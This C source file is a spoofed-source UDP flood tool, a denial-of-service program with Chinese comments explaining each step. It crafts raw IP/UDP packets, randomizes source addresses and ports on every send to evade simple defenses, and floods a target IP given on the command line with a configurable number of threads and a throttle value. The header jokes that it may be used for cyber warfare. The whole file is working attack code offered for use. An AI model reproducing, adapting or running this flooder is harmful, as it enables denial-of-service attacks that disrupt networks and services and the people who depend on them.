/*
        This is released under the GNU GPL License v3.0, and is allowed to be used for cyber warfare. ;)
*/
#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9      // 常用于随机数生成（没去查为什么）
static uint32_t Q[4096], c = 362436;
// 存储线程数据
struct thread_data{
        int throttle;             // 节流值
        int thread_id;            // 线程ID
        struct sockaddr_in sin;   // 目标地址
};

// 初始化随机数生成器的函数
void init_rand(uint32_t x)
{
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
 
        for (i = 3; i < 4096; i++)
                Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

// 用于生成随机数(线性同余)
uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;         
        c = (t >> 32);           
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}

// 用于两个字符串连接
char *myStrCat (char *s, char *a) {
    while (*s != '\0') s++;
    while (*a != '\0') *s++ = *a++;
    *s = '\0';
    return s;
}

// count为次数，该函数用于重复字符串(str)count次
char *replStr (char *str, size_t count) {
    if (count == 0) return NULL;
    char *ret = malloc (strlen (str) * count + count);
    if (ret == NULL) return NULL;
    *ret = '\0';
    char *tmp = myStrCat (ret, str);
    while (--count > 0) {
        tmp = myStrCat (tmp, str);
    }
    return ret;
}

// 计算校验和
unsigned short csum (unsigned short *buf, int nwords)
{
  unsigned long sum;
  for (sum = 0; nwords > 0; nwords--)
  sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return (unsigned short)(~sum);
}

// 设置IP头部
void setup_ip_header(struct iphdr *iph)
{
  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 0;
  iph->tot_len = sizeof(struct iphdr) + 1028;
  iph->id = htonl(54321);
  iph->frag_off = 0;
  iph->ttl = MAXTTL;
  iph->protocol = IPPROTO_UDP;
  iph->check = 0;
  iph->saddr = inet_addr("192.168.3.100");
}

// 设置UDP头部
void setup_udp_header(struct udphdr *udph)
{
  udph->source = htons(5678);
  udph->check = 0;
  char *data = (char *)udph + sizeof(struct udphdr);
  data = replStr("\xFF" "\xFF" "\xFF" "\xFF", 256);
  udph->len=htons(1028);
}


void *flood(void *par1)
{
  struct thread_data *td = (struct thread_data *)par1;
  char datagram[MAX_PACKET_SIZE];                                             // 构建UDP包
  struct iphdr *iph = (struct iphdr *)datagram;                               // 定位IP头位置
  struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);       // 定位UDP头位置
  struct sockaddr_in sin = td->sin;
  char new_ip[sizeof "255.255.255.255"];
  int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);                             // 创建套接字发送IP数据包，SOCK_RAW允许直接操作IP数据包
  if(s < 0){
    fprintf(stderr, "Could not open raw socket.\n");
    exit(-1);
  }
  memset(datagram, 0, MAX_PACKET_SIZE);
  setup_ip_header(iph);                                                      // IP、UDP初始化
  setup_udp_header(udph);
  udph->dest = htons (rand() % 20480);
  iph->daddr = sin.sin_addr.s_addr;                                          
  iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
  int tmp = 1;
  const int *val = &tmp;
  if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){           //设置套接字选项IP_HDRINCL, 让操作系统通过用户态填充IP头部
    fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
    exit(-1);
  }
  int throttle = td->throttle;
  uint32_t random_num;
  uint32_t ul_dst;
  init_rand(time(NULL));
  // 根据节流值(throttle)决定发送数据包的速率。如果节流值为0，则无节流，尽可能快地发送数据包。
  // 如果节流值非0，则在每次发送后进行暂停，以达到控制发送速率的目的。
  if(throttle == 0){
    while(1){
      sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
      // 每次发送，都会重新生成随机的源端口号和源IP地址，以此来绕过一些简单的防护措施。
      random_num = rand_cmwc();
      ul_dst = (random_num >> 24 & 0xFF) << 24 |
               (random_num >> 16 & 0xFF) << 16 |
               (random_num >> 8 & 0xFF) << 8 |
               (random_num & 0xFF);
 
      iph->saddr = ul_dst;
      udph->source = htons(random_num & 0xFFFF);
      iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
    }
  } else {
    while(1){
      throttle = td->throttle;    // 重新获取节流值，以支持动态调整
      sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
      random_num = rand_cmwc();
      ul_dst = (random_num >> 24 & 0xFF) << 24 |
               (random_num >> 16 & 0xFF) << 16 |
               (random_num >> 8 & 0xFF) << 8 |
               (random_num & 0xFF);
 
      iph->saddr = ul_dst;
      udph->source = htons(random_num & 0xFFFF);
      iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
     while(--throttle);       // 如果throttle不为0，那么会等待throttle次数的循环时间后再发送
    }
  }
}

int main(int argc, char *argv[ ])
{
  if(argc < 4){
    fprintf(stderr, "Invalid parameters!\n");
    fprintf(stdout, "Usage: %s <IP> <throttle> <threads> <time>\n", argv[0]);
    exit(-1);
  }
  fprintf(stdout, "Setting up Sockets...\n");
  int num_threads = atoi(argv[3]);
  pthread_t thread[num_threads];
  struct sockaddr_in sin;
  sin.sin_family = AF_INET;
  sin.sin_port = htons (rand() % 20480);
  sin.sin_addr.s_addr = inet_addr(argv[1]);
  struct thread_data td[num_threads];
  int i;
  for(i = 0;i<num_threads;i++){
    td[i].thread_id = i;
    td[i].sin = sin;
    td[i].throttle = atoi(argv[2]);
    pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
  }
  fprintf(stdout, "Starting Flood...\n");
  if(argc > 5)
  {
    sleep(atoi(argv[4]));
  } else {
    while(1){
      sleep(1);
    }
  }
  return 0;
}